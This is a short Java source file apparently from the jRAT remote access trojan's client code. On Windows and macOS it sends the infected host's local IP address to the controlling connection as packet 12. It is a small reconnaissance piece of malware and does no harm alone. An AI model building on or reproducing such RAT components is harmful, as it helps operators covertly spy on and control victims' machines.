package jrat.client.packets.outgoing;

import jrat.client.Connection;
import oslib.OperatingSystem;

import java.net.InetAddress;


public class Packet12InitLocalAddress implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		String address = "Unknown"; 
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
			try {
				address = InetAddress.getLocalHost().getHostAddress();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

        con.writeLine(address);
	}

	@Override
	public short getPacketId() {
		return (byte) 12;
	}
}